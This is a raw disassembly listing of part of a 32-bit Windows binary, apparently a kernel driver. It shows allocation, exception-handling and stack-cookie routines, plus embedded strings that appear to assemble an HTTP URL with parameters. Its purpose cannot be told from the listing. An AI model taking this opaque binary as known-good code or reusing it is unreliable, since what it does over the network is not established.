  4067f0:	74 05                	je     0x4067f7
  4067f2:	8b 5e 04             	mov    0x4(%esi),%ebx
  4067f5:	8b f8                	mov    %eax,%edi
  4067f7:	8b 45 08             	mov    0x8(%ebp),%eax
  4067fa:	68 51 61 78 58       	push   $0x58786151
  4067ff:	50                   	push   %eax
  406800:	6a 05                	push   $0x5
  406802:	89 46 08             	mov    %eax,0x8(%esi)
  406805:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  40680c:	ff 15 f4 70 40 00    	call   *0x4070f4
  406812:	89 06                	mov    %eax,(%esi)
  406814:	85 c0                	test   %eax,%eax
  406816:	74 29                	je     0x406841
  406818:	8b 4e 08             	mov    0x8(%esi),%ecx
  40681b:	85 c9                	test   %ecx,%ecx
  40681d:	74 0e                	je     0x40682d
  40681f:	90                   	nop
  406820:	c6 00 00             	movb   $0x0,(%eax)
  406823:	8d 40 01             	lea    0x1(%eax),%eax
  406826:	83 e9 01             	sub    $0x1,%ecx
  406829:	75 f5                	jne    0x406820
  40682b:	8b 06                	mov    (%esi),%eax
  40682d:	85 ff                	test   %edi,%edi
  40682f:	74 20                	je     0x406851
  406831:	53                   	push   %ebx
  406832:	57                   	push   %edi
  406833:	50                   	push   %eax
  406834:	e8 91 00 00 00       	call   0x4068ca
  406839:	83 c4 0c             	add    $0xc,%esp
  40683c:	89 5e 04             	mov    %ebx,0x4(%esi)
  40683f:	eb 04                	jmp    0x406845
  406841:	85 ff                	test   %edi,%edi
  406843:	74 0c                	je     0x406851
  406845:	68 51 61 78 58       	push   $0x58786151
  40684a:	57                   	push   %edi
  40684b:	ff 15 ac 71 40 00    	call   *0x4071ac
  406851:	83 3e 00             	cmpl   $0x0,(%esi)
  406854:	5f                   	pop    %edi
  406855:	5e                   	pop    %esi
  406856:	0f 95 c0             	setne  %al
  406859:	5b                   	pop    %ebx
  40685a:	5d                   	pop    %ebp
  40685b:	c2 04 00             	ret    $0x4
  40685e:	cc                   	int3
  40685f:	cc                   	int3
  406860:	8b 41 04             	mov    0x4(%ecx),%eax
  406863:	c3                   	ret
  406864:	ff 25 70 70 40 00    	jmp    *0x407070
  40686a:	ff 25 68 70 40 00    	jmp    *0x407068
  406870:	ff 25 64 70 40 00    	jmp    *0x407064
  406876:	ff 25 60 70 40 00    	jmp    *0x407060
  40687c:	ff 25 5c 70 40 00    	jmp    *0x40705c
  406882:	ff 25 58 70 40 00    	jmp    *0x407058
  406888:	ff 25 54 70 40 00    	jmp    *0x407054
  40688e:	ff 25 50 70 40 00    	jmp    *0x407050
  406894:	ff 25 4c 70 40 00    	jmp    *0x40704c
  40689a:	ff 25 48 70 40 00    	jmp    *0x407048
  4068a0:	ff 25 44 70 40 00    	jmp    *0x407044
  4068a6:	ff 25 38 70 40 00    	jmp    *0x407038
  4068ac:	ff 25 30 70 40 00    	jmp    *0x407030
  4068b2:	ff 25 34 70 40 00    	jmp    *0x407034
  4068b8:	ff 25 6c 70 40 00    	jmp    *0x40706c
  4068be:	ff 25 3c 70 40 00    	jmp    *0x40703c
  4068c4:	ff 25 40 70 40 00    	jmp    *0x407040
  4068ca:	ff 25 c0 71 40 00    	jmp    *0x4071c0
  4068d0:	ff 25 bc 71 40 00    	jmp    *0x4071bc
  4068d6:	ff 25 b8 71 40 00    	jmp    *0x4071b8
  4068dc:	cc                   	int3
  4068dd:	cc                   	int3
  4068de:	cc                   	int3
  4068df:	cc                   	int3
  4068e0:	c2 00 00             	ret    $0x0
  4068e3:	ff 25 b8 70 40 00    	jmp    *0x4070b8
  4068e9:	ff 25 cc 70 40 00    	jmp    *0x4070cc
  4068ef:	ff 25 d0 70 40 00    	jmp    *0x4070d0
  4068f5:	ff 25 d4 70 40 00    	jmp    *0x4070d4
  4068fb:	ff 25 d8 70 40 00    	jmp    *0x4070d8
  406901:	ff 25 dc 70 40 00    	jmp    *0x4070dc
  406907:	ff 25 e0 70 40 00    	jmp    *0x4070e0
  40690d:	ff 25 e8 70 40 00    	jmp    *0x4070e8
  406913:	ff 25 ec 70 40 00    	jmp    *0x4070ec
  406919:	ff 25 f0 70 40 00    	jmp    *0x4070f0
  40691f:	ff 25 c4 71 40 00    	jmp    *0x4071c4
  406925:	ff 25 00 71 40 00    	jmp    *0x407100
  40692b:	ff 25 64 71 40 00    	jmp    *0x407164
  406931:	ff 25 70 71 40 00    	jmp    *0x407170
  406937:	ff 25 74 71 40 00    	jmp    *0x407174
  40693d:	cc                   	int3
  40693e:	cc                   	int3
  40693f:	cc                   	int3
  406940:	8b ff                	mov    %edi,%edi
  406942:	55                   	push   %ebp
  406943:	8b ec                	mov    %esp,%ebp
  406945:	56                   	push   %esi
  406946:	8b 75 08             	mov    0x8(%ebp),%esi
  406949:	57                   	push   %edi
  40694a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40694d:	8b 06                	mov    (%esi),%eax
  40694f:	83 f8 fe             	cmp    $0xfffffffe,%eax
  406952:	74 0d                	je     0x406961
  406954:	8b 4e 04             	mov    0x4(%esi),%ecx
  406957:	03 cf                	add    %edi,%ecx
  406959:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40695c:	e8 15 03 00 00       	call   0x406c76
  406961:	8b 46 08             	mov    0x8(%esi),%eax
  406964:	8b 4e 0c             	mov    0xc(%esi),%ecx
  406967:	03 cf                	add    %edi,%ecx
  406969:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40696c:	5f                   	pop    %edi
  40696d:	5e                   	pop    %esi
  40696e:	5d                   	pop    %ebp
  40696f:	e9 02 03 00 00       	jmp    0x406c76
  406974:	cc                   	int3
  406975:	cc                   	int3
  406976:	cc                   	int3
  406977:	cc                   	int3
  406978:	cc                   	int3
  406979:	cc                   	int3
  40697a:	cc                   	int3
  40697b:	cc                   	int3
  40697c:	cc                   	int3
  40697d:	cc                   	int3
  40697e:	cc                   	int3
  40697f:	cc                   	int3
  406980:	8b ff                	mov    %edi,%edi
  406982:	55                   	push   %ebp
  406983:	8b ec                	mov    %esp,%ebp
  406985:	83 ec 14             	sub    $0x14,%esp
  406988:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40698b:	53                   	push   %ebx
  40698c:	56                   	push   %esi
  40698d:	57                   	push   %edi
  40698e:	8b 79 08             	mov    0x8(%ecx),%edi
  406991:	8d 71 10             	lea    0x10(%ecx),%esi
  406994:	33 3d a4 a7 40 00    	xor    0x40a7a4,%edi
  40699a:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4069a1:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4069a8:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4069ac:	8b 07                	mov    (%edi),%eax
  4069ae:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4069b5:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4069b8:	74 0d                	je     0x4069c7
  4069ba:	8b 4f 04             	mov    0x4(%edi),%ecx
  4069bd:	03 ce                	add    %esi,%ecx
  4069bf:	33 0c 06             	xor    (%esi,%eax,1),%ecx
  4069c2:	e8 af 02 00 00       	call   0x406c76
  4069c7:	8b 47 08             	mov    0x8(%edi),%eax
  4069ca:	8b 4f 0c             	mov    0xc(%edi),%ecx
  4069cd:	03 ce                	add    %esi,%ecx
  4069cf:	33 0c 06             	xor    (%esi,%eax,1),%ecx
  4069d2:	e8 9f 02 00 00       	call   0x406c76
  4069d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4069da:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4069dd:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  4069e1:	8b 59 0c             	mov    0xc(%ecx),%ebx
  4069e4:	75 63                	jne    0x406a49
  4069e6:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4069e9:	8b 45 10             	mov    0x10(%ebp),%eax
  4069ec:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4069ef:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4069f2:	89 41 fc             	mov    %eax,-0x4(%ecx)
  4069f5:	83 fb fe             	cmp    $0xfffffffe,%ebx
  4069f8:	0f 84 84 00 00 00    	je     0x406a82
  4069fe:	8b ff                	mov    %edi,%edi
  406a00:	8d 43 02             	lea    0x2(%ebx),%eax
  406a03:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  406a06:	8b 4c 87 04          	mov    0x4(%edi,%eax,4),%ecx
  406a0a:	8d 04 87             	lea    (%edi,%eax,4),%eax
  406a0d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a10:	8b 00                	mov    (%eax),%eax
  406a12:	89 45 08             	mov    %eax,0x8(%ebp)
  406a15:	85 c9                	test   %ecx,%ecx
  406a17:	74 17                	je     0x406a30
  406a19:	8b d6                	mov    %esi,%edx
  406a1b:	e8 a4 01 00 00       	call   0x406bc4
  406a20:	b1 01                	mov    $0x1,%cl
  406a22:	88 4d ff             	mov    %cl,-0x1(%ebp)
  406a25:	85 c0                	test   %eax,%eax
  406a27:	78 17                	js     0x406a40
  406a29:	7f 61                	jg     0x406a8c
  406a2b:	8b 45 08             	mov    0x8(%ebp),%eax
  406a2e:	eb 03                	jmp    0x406a33
  406a30:	8a 4d ff             	mov    -0x1(%ebp),%cl
  406a33:	8b d8                	mov    %eax,%ebx
  406a35:	83 f8 fe             	cmp    $0xfffffffe,%eax
  406a38:	75 c6                	jne    0x406a00
  406a3a:	84 c9                	test   %cl,%cl
  406a3c:	74 44                	je     0x406a82
  406a3e:	eb 1e                	jmp    0x406a5e
  406a40:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  406a47:	eb 15                	jmp    0x406a5e
  406a49:	83 fb fe             	cmp    $0xfffffffe,%ebx
  406a4c:	74 34                	je     0x406a82
  406a4e:	68 a4 a7 40 00       	push   $0x40a7a4
  406a53:	56                   	push   %esi
  406a54:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  406a59:	e8 b6 01 00 00       	call   0x406c14
  406a5e:	8b 07                	mov    (%edi),%eax
  406a60:	83 f8 fe             	cmp    $0xfffffffe,%eax
  406a63:	74 0d                	je     0x406a72
  406a65:	8b 4f 04             	mov    0x4(%edi),%ecx
  406a68:	03 ce                	add    %esi,%ecx
  406a6a:	33 0c 06             	xor    (%esi,%eax,1),%ecx
  406a6d:	e8 04 02 00 00       	call   0x406c76
  406a72:	8b 57 08             	mov    0x8(%edi),%edx
  406a75:	8b 4f 0c             	mov    0xc(%edi),%ecx
  406a78:	03 ce                	add    %esi,%ecx
  406a7a:	33 0c 16             	xor    (%esi,%edx,1),%ecx
  406a7d:	e8 f4 01 00 00       	call   0x406c76
  406a82:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406a85:	5f                   	pop    %edi
  406a86:	5e                   	pop    %esi
  406a87:	5b                   	pop    %ebx
  406a88:	8b e5                	mov    %ebp,%esp
  406a8a:	5d                   	pop    %ebp
  406a8b:	c3                   	ret
  406a8c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406a8f:	e8 64 01 00 00       	call   0x406bf8
  406a94:	8b 45 0c             	mov    0xc(%ebp),%eax
  406a97:	39 58 0c             	cmp    %ebx,0xc(%eax)
  406a9a:	74 0f                	je     0x406aab
  406a9c:	68 a4 a7 40 00       	push   $0x40a7a4
  406aa1:	56                   	push   %esi
  406aa2:	8b d3                	mov    %ebx,%edx
  406aa4:	8b c8                	mov    %eax,%ecx
  406aa6:	e8 69 01 00 00       	call   0x406c14
  406aab:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406aae:	8b 45 08             	mov    0x8(%ebp),%eax
  406ab1:	56                   	push   %esi
  406ab2:	57                   	push   %edi
  406ab3:	89 41 0c             	mov    %eax,0xc(%ecx)
  406ab6:	e8 85 fe ff ff       	call   0x406940
  406abb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406abe:	83 c4 08             	add    $0x8,%esp
  406ac1:	8b d6                	mov    %esi,%edx
  406ac3:	8b 49 08             	mov    0x8(%ecx),%ecx
  406ac6:	e8 11 01 00 00       	call   0x406bdc
  406acb:	cc                   	int3
  406acc:	cc                   	int3
  406acd:	cc                   	int3
  406ace:	cc                   	int3
  406acf:	cc                   	int3
  406ad0:	53                   	push   %ebx
  406ad1:	56                   	push   %esi
  406ad2:	57                   	push   %edi
  406ad3:	8b 54 24 10          	mov    0x10(%esp),%edx
  406ad7:	8b 44 24 14          	mov    0x14(%esp),%eax
  406adb:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  406adf:	55                   	push   %ebp
  406ae0:	52                   	push   %edx
  406ae1:	50                   	push   %eax
  406ae2:	51                   	push   %ecx
  406ae3:	51                   	push   %ecx
  406ae4:	68 60 6b 40 00       	push   $0x406b60
  406ae9:	64 ff 35 00 00 00 00 	push   %fs:0x0
  406af0:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  406af5:	33 c4                	xor    %esp,%eax
  406af7:	89 44 24 08          	mov    %eax,0x8(%esp)
  406afb:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406b02:	8b 44 24 30          	mov    0x30(%esp),%eax
  406b06:	8b 58 08             	mov    0x8(%eax),%ebx
  406b09:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  406b0d:	33 19                	xor    (%ecx),%ebx
  406b0f:	8b 70 0c             	mov    0xc(%eax),%esi
  406b12:	83 fe fe             	cmp    $0xfffffffe,%esi
  406b15:	74 3b                	je     0x406b52
  406b17:	8b 54 24 34          	mov    0x34(%esp),%edx
  406b1b:	83 fa fe             	cmp    $0xfffffffe,%edx
  406b1e:	74 04                	je     0x406b24
  406b20:	3b f2                	cmp    %edx,%esi
  406b22:	76 2e                	jbe    0x406b52
  406b24:	8d 34 76             	lea    (%esi,%esi,2),%esi
  406b27:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  406b2b:	8b 0b                	mov    (%ebx),%ecx
  406b2d:	89 48 0c             	mov    %ecx,0xc(%eax)
  406b30:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  406b34:	75 cc                	jne    0x406b02
  406b36:	68 01 01 00 00       	push   $0x101
  406b3b:	8b 43 08             	mov    0x8(%ebx),%eax
  406b3e:	e8 f2 00 00 00       	call   0x406c35
  406b43:	b9 01 00 00 00       	mov    $0x1,%ecx
  406b48:	8b 43 08             	mov    0x8(%ebx),%eax
  406b4b:	e8 04 01 00 00       	call   0x406c54
  406b50:	eb b0                	jmp    0x406b02
  406b52:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  406b59:	83 c4 18             	add    $0x18,%esp
  406b5c:	5f                   	pop    %edi
  406b5d:	5e                   	pop    %esi
  406b5e:	5b                   	pop    %ebx
  406b5f:	c3                   	ret
  406b60:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406b64:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  406b6b:	b8 01 00 00 00       	mov    $0x1,%eax
  406b70:	74 33                	je     0x406ba5
  406b72:	8b 44 24 08          	mov    0x8(%esp),%eax
  406b76:	8b 48 08             	mov    0x8(%eax),%ecx
  406b79:	33 c8                	xor    %eax,%ecx
  406b7b:	e8 f6 00 00 00       	call   0x406c76
  406b80:	55                   	push   %ebp
  406b81:	8b 68 18             	mov    0x18(%eax),%ebp
  406b84:	ff 70 0c             	push   0xc(%eax)
  406b87:	ff 70 10             	push   0x10(%eax)
  406b8a:	ff 70 14             	push   0x14(%eax)
  406b8d:	e8 3e ff ff ff       	call   0x406ad0
  406b92:	83 c4 0c             	add    $0xc,%esp
  406b95:	5d                   	pop    %ebp
  406b96:	8b 44 24 08          	mov    0x8(%esp),%eax
  406b9a:	8b 54 24 10          	mov    0x10(%esp),%edx
  406b9e:	89 02                	mov    %eax,(%edx)
  406ba0:	b8 03 00 00 00       	mov    $0x3,%eax
  406ba5:	c3                   	ret
  406ba6:	8b ff                	mov    %edi,%edi
  406ba8:	55                   	push   %ebp
  406ba9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406bad:	8b 29                	mov    (%ecx),%ebp
  406baf:	ff 71 1c             	push   0x1c(%ecx)
  406bb2:	ff 71 18             	push   0x18(%ecx)
  406bb5:	ff 71 28             	push   0x28(%ecx)
  406bb8:	e8 13 ff ff ff       	call   0x406ad0
  406bbd:	83 c4 0c             	add    $0xc,%esp
  406bc0:	5d                   	pop    %ebp
  406bc1:	c2 04 00             	ret    $0x4
  406bc4:	55                   	push   %ebp
  406bc5:	56                   	push   %esi
  406bc6:	57                   	push   %edi
  406bc7:	53                   	push   %ebx
  406bc8:	8b ea                	mov    %edx,%ebp
  406bca:	33 c0                	xor    %eax,%eax
  406bcc:	33 db                	xor    %ebx,%ebx
  406bce:	33 d2                	xor    %edx,%edx
  406bd0:	33 f6                	xor    %esi,%esi
  406bd2:	33 ff                	xor    %edi,%edi
  406bd4:	ff d1                	call   *%ecx
  406bd6:	5b                   	pop    %ebx
  406bd7:	5f                   	pop    %edi
  406bd8:	5e                   	pop    %esi
  406bd9:	5d                   	pop    %ebp
  406bda:	c3                   	ret
  406bdb:	90                   	nop
  406bdc:	8b ea                	mov    %edx,%ebp
  406bde:	8b f1                	mov    %ecx,%esi
  406be0:	8b c1                	mov    %ecx,%eax
  406be2:	6a 01                	push   $0x1
  406be4:	e8 4c 00 00 00       	call   0x406c35
  406be9:	33 c0                	xor    %eax,%eax
  406beb:	33 db                	xor    %ebx,%ebx
  406bed:	33 c9                	xor    %ecx,%ecx
  406bef:	33 d2                	xor    %edx,%edx
  406bf1:	33 ff                	xor    %edi,%edi
  406bf3:	ff e6                	jmp    *%esi
  406bf5:	8d 49 00             	lea    0x0(%ecx),%ecx
  406bf8:	55                   	push   %ebp
  406bf9:	8b ec                	mov    %esp,%ebp
  406bfb:	53                   	push   %ebx
  406bfc:	56                   	push   %esi
  406bfd:	57                   	push   %edi
  406bfe:	6a 00                	push   $0x0
  406c00:	6a 00                	push   $0x0
  406c02:	68 0d 6c 40 00       	push   $0x406c0d
  406c07:	51                   	push   %ecx
  406c08:	e8 4a 00 00 00       	call   0x406c57
  406c0d:	5f                   	pop    %edi
  406c0e:	5e                   	pop    %esi
  406c0f:	5b                   	pop    %ebx
  406c10:	5d                   	pop    %ebp
  406c11:	c3                   	ret
  406c12:	8b ff                	mov    %edi,%edi
  406c14:	55                   	push   %ebp
  406c15:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  406c19:	52                   	push   %edx
  406c1a:	51                   	push   %ecx
  406c1b:	ff 74 24 14          	push   0x14(%esp)
  406c1f:	e8 ac fe ff ff       	call   0x406ad0
  406c24:	83 c4 0c             	add    $0xc,%esp
  406c27:	5d                   	pop    %ebp
  406c28:	c2 08 00             	ret    $0x8
  406c2b:	cc                   	int3
  406c2c:	53                   	push   %ebx
  406c2d:	51                   	push   %ecx
  406c2e:	bb 94 a7 40 00       	mov    $0x40a794,%ebx
  406c33:	eb 0b                	jmp    0x406c40
  406c35:	53                   	push   %ebx
  406c36:	51                   	push   %ecx
  406c37:	bb 94 a7 40 00       	mov    $0x40a794,%ebx
  406c3c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406c40:	89 4b 08             	mov    %ecx,0x8(%ebx)
  406c43:	89 43 04             	mov    %eax,0x4(%ebx)
  406c46:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  406c49:	55                   	push   %ebp
  406c4a:	51                   	push   %ecx
  406c4b:	50                   	push   %eax
  406c4c:	58                   	pop    %eax
  406c4d:	59                   	pop    %ecx
  406c4e:	5d                   	pop    %ebp
  406c4f:	59                   	pop    %ecx
  406c50:	5b                   	pop    %ebx
  406c51:	c2 04 00             	ret    $0x4
  406c54:	ff d0                	call   *%eax
  406c56:	c3                   	ret
  406c57:	ff 25 90 71 40 00    	jmp    *0x407190
  406c5d:	ff 25 14 70 40 00    	jmp    *0x407014
  406c63:	ff 25 10 70 40 00    	jmp    *0x407010
  406c69:	ff 25 0c 70 40 00    	jmp    *0x40700c
  406c6f:	ff 25 08 70 40 00    	jmp    *0x407008
  406c75:	cc                   	int3
  406c76:	3b 0d a4 a7 40 00    	cmp    0x40a7a4,%ecx
  406c7c:	75 03                	jne    0x406c81
  406c7e:	c2 00 00             	ret    $0x0
  406c81:	e9 00 00 00 00       	jmp    0x406c86
  406c86:	8b ff                	mov    %edi,%edi
  406c88:	55                   	push   %ebp
  406c89:	8b ec                	mov    %esp,%ebp
  406c8b:	51                   	push   %ecx
  406c8c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406c90:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406c93:	6a 00                	push   $0x0
  406c95:	ff 35 a8 a7 40 00    	push   0x40a7a8
  406c9b:	ff 35 a4 a7 40 00    	push   0x40a7a4
  406ca1:	ff 75 fc             	push   -0x4(%ebp)
  406ca4:	68 f7 00 00 00       	push   $0xf7
  406ca9:	ff 15 a8 71 40 00    	call   *0x4071a8
  406caf:	cc                   	int3
  406cb0:	6a 08                	push   $0x8
  406cb2:	e8 01 00 00 00       	call   0x406cb8
  406cb7:	cc                   	int3
  406cb8:	8b ff                	mov    %edi,%edi
  406cba:	55                   	push   %ebp
  406cbb:	8b ec                	mov    %esp,%ebp
  406cbd:	6a 01                	push   $0x1
  406cbf:	ff 35 a8 a7 40 00    	push   0x40a7a8
  406cc5:	ff 35 a4 a7 40 00    	push   0x40a7a4
  406ccb:	ff 75 08             	push   0x8(%ebp)
  406cce:	68 f7 00 00 00       	push   $0xf7
  406cd3:	ff 15 a8 71 40 00    	call   *0x4071a8
  406cd9:	cc                   	int3
  406cda:	ff 25 28 70 40 00    	jmp    *0x407028
  406ce0:	ff 25 1c 70 40 00    	jmp    *0x40701c
  406ce6:	cc                   	int3
  406ce7:	cc                   	int3
  406ce8:	cc                   	int3
  406ce9:	cc                   	int3
  406cea:	cc                   	int3
  406ceb:	cc                   	int3
  406cec:	cc                   	int3
  406ced:	cc                   	int3
  406cee:	cc                   	int3
  406cef:	cc                   	int3
  406cf0:	ff 25 20 70 40 00    	jmp    *0x407020
  406cf6:	cc                   	int3
  406cf7:	cc                   	int3
  406cf8:	cc                   	int3
  406cf9:	cc                   	int3
  406cfa:	cc                   	int3
  406cfb:	cc                   	int3
  406cfc:	cc                   	int3
  406cfd:	cc                   	int3
  406cfe:	cc                   	int3
  406cff:	cc                   	int3
  406d00:	ff 25 24 70 40 00    	jmp    *0x407024
  406d06:	49                   	dec    %ecx
  406d07:	00 6d 00             	add    %ch,0x0(%ebp)
  406d0a:	61                   	popa
  406d0b:	00 67 00             	add    %ah,0x0(%edi)
  406d0e:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  406d12:	61                   	popa
  406d13:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  406d17:	00 00                	add    %al,(%eax)
  406d19:	00 31                	add    %dh,(%ecx)
  406d1b:	32 31                	xor    (%ecx),%dh
  406d1d:	33 61 38             	xor    0x38(%ecx),%esp
  406d20:	61                   	popa
  406d21:	35 34 34 31 65       	xor    $0x65313434,%eax
  406d26:	39 62 66             	cmp    %esp,0x66(%edx)
  406d29:	33 66 65             	xor    0x65(%esi),%esp
  406d2c:	31 32                	xor    %esi,(%edx)
  406d2e:	31 36                	xor    %esi,(%esi)
  406d30:	31 31                	xor    %esi,(%ecx)
  406d32:	30 63 64             	xor    %ah,0x64(%ebx)
  406d35:	65 64 36 35 36 00 cc 	gs fs ss xor $0x25cc0036,%eax
  406d3c:	25 
  406d3d:	30 32                	xor    %dh,(%edx)
  406d3f:	78 25                	js     0x406d66
  406d41:	30 32                	xor    %dh,(%edx)
  406d43:	78 25                	js     0x406d6a
  406d45:	30 32                	xor    %dh,(%edx)
  406d47:	78 25                	js     0x406d6e
  406d49:	30 32                	xor    %dh,(%edx)
  406d4b:	78 25                	js     0x406d72
  406d4d:	30 32                	xor    %dh,(%edx)
  406d4f:	78 25                	js     0x406d76
  406d51:	30 32                	xor    %dh,(%edx)
  406d53:	78 25                	js     0x406d7a
  406d55:	30 32                	xor    %dh,(%edx)
  406d57:	78 25                	js     0x406d7e
  406d59:	30 32                	xor    %dh,(%edx)
  406d5b:	78 25                	js     0x406d82
  406d5d:	30 32                	xor    %dh,(%edx)
  406d5f:	78 25                	js     0x406d86
  406d61:	30 32                	xor    %dh,(%edx)
  406d63:	78 25                	js     0x406d8a
  406d65:	30 32                	xor    %dh,(%edx)
  406d67:	78 25                	js     0x406d8e
  406d69:	30 32                	xor    %dh,(%edx)
  406d6b:	78 25                	js     0x406d92
  406d6d:	30 32                	xor    %dh,(%edx)
  406d6f:	78 25                	js     0x406d96
  406d71:	30 32                	xor    %dh,(%edx)
  406d73:	78 25                	js     0x406d9a
  406d75:	30 32                	xor    %dh,(%edx)
  406d77:	78 25                	js     0x406d9e
  406d79:	30 32                	xor    %dh,(%edx)
  406d7b:	78 00                	js     0x406d7d
  406d7d:	cc                   	int3
  406d7e:	33 00                	xor    (%eax),%eax
  406d80:	32 00                	xor    (%eax),%al
  406d82:	30 00                	xor    %al,(%eax)
  406d84:	30 00                	xor    %al,(%eax)
  406d86:	30 00                	xor    %al,(%eax)
  406d88:	30 00                	xor    %al,(%eax)
  406d8a:	00 00                	add    %al,(%eax)
  406d8c:	25 73 63 3d 25       	and    $0x253d6373,%eax
  406d91:	73 00                	jae    0x406d93
  406d93:	cc                   	int3
  406d94:	6f                   	outsl  %ds:(%esi),(%dx)
  406d95:	6b 00 cc             	imul   $0xffffffcc,(%eax),%eax
  406d98:	25 30 38 58 25       	and    $0x25583830,%eax
  406d9d:	30 38                	xor    %bh,(%eax)
  406d9f:	58                   	pop    %eax
  406da0:	00 cc                	add    %cl,%ah
  406da2:	5b                   	pop    %ebx
  406da3:	00 5d 00             	add    %bl,0x0(%ebp)
  406da6:	7b 00                	jnp    0x406da8
  406da8:	42                   	inc    %edx
  406da9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406dad:	00 62 00             	add    %ah,0x0(%edx)
  406db0:	00 00                	add    %al,(%eax)
  406db2:	76 3d                	jbe    0x406df1
  406db4:	00 cc                	add    %cl,%ah
  406db6:	26 6d                	es insl (%dx),%es:(%edi)
  406db8:	3d 00 68 74 74       	cmp    $0x74746800,%eax
  406dbd:	70 3a                	jo     0x406df9
  406dbf:	2f                   	das
  406dc0:	2f                   	das
  406dc1:	00 72 00             	add    %dh,0x0(%edx)
  406dc4:	34 00                	xor    $0x0,%al
  406dc6:	00 00                	add    %al,(%eax)
  406dc8:	69 00 34 00 00 00    	imul   $0x34,(%eax),%eax
  406dce:	72 00                	jb     0x406dd0
  406dd0:	73 00                	jae    0x406dd2
  406dd2:	00 00                	add    %al,(%eax)
  406dd4:	72 00                	jb     0x406dd6
  406dd6:	66 00 76 00          	data16 add %dh,0x0(%esi)
  406dda:	34 00                	xor    $0x0,%al
  406ddc:	00 00                	add    %al,(%eax)
  406dde:	2f                   	das
  406ddf:	2f                   	das
  406de0:	00 cc                	add    %cl,%ah
  406de2:	38 30                	cmp    %dh,(%eax)
  406de4:	00 cc                	add    %cl,%ah
  406de6:	2f                   	das
	...

Disassembly of section INIT:

00412000 <INIT>:
  412000:	8b ff                	mov    %edi,%edi
  412002:	55                   	push   %ebp
  412003:	8b ec                	mov    %esp,%ebp
  412005:	51                   	push   %ecx
  412006:	51                   	push   %ecx
  412007:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  41200c:	b9 4e e6 40 bb       	mov    $0xbb40e64e,%ecx
  412011:	85 c0                	test   %eax,%eax
  412013:	74 04                	je     0x412019
  412015:	3b c1                	cmp    %ecx,%eax
  412017:	75 15                	jne    0x41202e
  412019:	0f 31                	rdtsc
  41201b:	35 a4 a7 40 00       	xor    $0x40a7a4,%eax
  412020:	a3 a4 a7 40 00       	mov    %eax,0x40a7a4
  412025:	75 07                	jne    0x41202e
  412027:	8b c1                	mov    %ecx,%eax
  412029:	a3 a4 a7 40 00       	mov    %eax,0x40a7a4
  41202e:	f7 d0                	not    %eax
  412030:	a3 a8 a7 40 00       	mov    %eax,0x40a7a8
  412035:	c9                   	leave
  412036:	c3                   	ret
  412037:	cc                   	int3
  412038:	e0 20                	loopne 0x41205a
  41203a:	01 00                	add    %eax,(%eax)
	...
  412044:	28 24 01             	sub    %ah,(%ecx,%eax,1)
  412047:	00 30                	add    %dh,(%eax)
  412049:	70 00                	jo     0x41204b
  41204b:	00 28                	add    %ch,(%eax)
  41204d:	21 01                	and    %eax,(%ecx)
	...
  412057:	00 32                	add    %dh,(%edx)
  412059:	2a 01                	sub    (%ecx),%al
  41205b:	00 78 70             	add    %bh,0x70(%eax)
  41205e:	00 00                	add    %al,(%eax)
  412060:	b8 20 01 00 00       	mov    $0x120,%eax
  412065:	00 00                	add    %al,(%eax)
  412067:	00 00                	add    %al,(%eax)
  412069:	00 00                	add    %al,(%eax)
  41206b:	00 9a 2a 01 00 08    	add    %bl,0x800012a(%edx)
  412071:	70 00                	jo     0x412073
  412073:	00 b0 20 01 00 00    	add    %dh,0x120(%eax)
  412079:	00 00                	add    %al,(%eax)
  41207b:	00 00                	add    %al,(%eax)
  41207d:	00 00                	add    %al,(%eax)
  41207f:	00 c8                	add    %cl,%al
  412081:	2a 01                	sub    (%ecx),%al
  412083:	00 00                	add    %al,(%eax)
  412085:	70 00                	jo     0x412087
  412087:	00 cc                	add    %cl,%ah
  412089:	20 01                	and    %al,(%ecx)
	...
  412093:	00 3c 2b             	add    %bh,(%ebx,%ebp,1)
  412096:	01 00                	add    %eax,(%eax)
  412098:	1c 70                	sbb    $0x70,%al
	...
  4120ae:	00 00                	add    %al,(%eax)
  4120b0:	b4 2a                	mov    $0x2a,%ah
  4120b2:	01 00                	add    %eax,(%eax)
